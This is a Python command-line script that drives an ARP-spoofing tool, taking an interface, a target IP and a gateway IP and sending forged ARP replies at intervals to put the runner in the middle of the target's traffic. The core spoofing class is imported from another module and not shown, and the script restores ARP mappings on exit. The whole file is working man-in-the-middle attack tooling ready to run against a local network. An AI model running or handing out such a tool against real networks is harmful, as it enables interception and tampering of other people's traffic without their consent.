from __future__ import annotations

import argparse
import logging
import time

from arp_spoof import ArpSpoofer

logger = logging.getLogger(__name__)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Continuously ARP-spoof target_ip <-> gateway_ip on interface.")
    parser.add_argument("interface", help="Network interface to spoof on, e.g. eth0")
    parser.add_argument("target_ip", help="IP of the device being MITM'd, e.g. your laptop")
    parser.add_argument("gateway_ip", help="IP of the router/gateway")
    parser.add_argument("--target-mac", default=None, help="Skip ARP resolution if already known")
    parser.add_argument("--gateway-mac", default=None, help="Skip ARP resolution if already known")
    parser.add_argument("--interval", type=float, default=2.5, help="Seconds between forged ARP replies")
    return parser.parse_args()


def on_error(error: Exception) -> None:
    print(f"[!] ARP spoofer error: {error}")


def main() -> None:
    logging.basicConfig(level=logging.INFO)
    args = parse_args()

    spoofer = ArpSpoofer(
        interface=args.interface,
        target_ip=args.target_ip,
        gateway_ip=args.gateway_ip,
        target_mac=args.target_mac,
        gateway_mac=args.gateway_mac,
        interval=args.interval,
        on_error=on_error,
    )

    print(f"Spoofing {args.target_ip} <-> {args.gateway_ip} on {args.interface}... press Ctrl+C to stop.")
    spoofer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping and restoring real ARP mappings...")
    finally:
        spoofer.stop()


if __name__ == "__main__":
    main()
